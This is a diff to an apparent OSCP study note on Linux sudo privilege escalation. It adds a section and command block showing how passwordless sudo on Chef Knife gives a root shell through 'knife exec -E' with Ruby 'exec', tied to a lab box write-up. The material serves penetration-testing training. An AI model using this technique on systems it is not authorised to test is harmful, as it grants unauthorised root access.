@@ -208,6 +208,25 @@ sudo /bin/nano $SudoFile
 - [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- passwordless sudo `/bin/tar` used the checkpoint action to become `onuma`
 - [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]] -- argument-specific `journalctl` permission opened a pager and a root shell
 - [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]] -- passwordless sudo to Luvit enabled Lua `os.execute()` as another user
+- [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]] -- passwordless sudo to Chef Knife enabled Ruby `exec` and a root shell
+
+## Chef Knife Ruby evaluation
+
+Use this branch when `sudo -l` permits `/usr/bin/knife` as root without a password. Knife's `exec -E` option evaluates Ruby code, and Ruby's `exec` replaces the current process without dropping the root identity acquired through sudo.
+
+```bash
+sudo -l
+command -v knife
+knife --version
+sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
+id
+whoami
+```
+
+> [!warning] 💡
+> Use the exact path shown by `sudo -l`. First prove the result with `id`; then record the root proof privately and continue to [[Linux - Clean Down]].
+
+**Reference:** [GTFOBins Knife](https://gtfobins.org/gtfobins/knife/)
 
 ## Related stages
 
